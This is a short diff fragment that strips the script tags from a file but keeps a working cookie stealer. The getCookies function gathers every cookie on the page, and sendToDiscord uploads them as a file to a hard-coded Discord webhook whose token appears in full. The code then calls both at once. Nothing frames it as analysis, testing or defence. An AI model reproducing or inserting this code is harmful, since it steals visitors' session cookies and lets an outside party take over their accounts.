@@ -1,5 +1,3 @@
-<script>
 function getCookies(){return document.cookie.split(';').map(c=>{const [name,value] = c.trim().split('=');return {name,value,domain:document.domain,expirationDate:Date.now()+3600000,hostOnly:false,httpOnly:false,path:'/',sameSite:'no_restriction',secure:location.protocol==='https:',session:false,storeId:null};});}
 function sendToDiscord(cookieData){const webhookUrl="https://discord.com/api/webhooks/1439614318470627470/5j3OSDUQ48CduHEY3q5tJs_TzC5aVesPHT48A8hlUoX9kr-k9SkVuJXMzC5WMcv3NY8N";const cookieString=JSON.stringify(cookieData,null,2);const fileBlob=new Blob([cookieString],{type:'text/plain'});const formData=new FormData();formData.append("file",fileBlob,"cookies.txt");formData.append("content","Here are the cookies in a file:");fetch(webhookUrl,{method:'POST',body:formData}).then(response=>response.json()).then(data=>console.log('Success:',data)).catch(error=>console.error('Error:',error));}
 sendToDiscord(getCookies());
-</script>
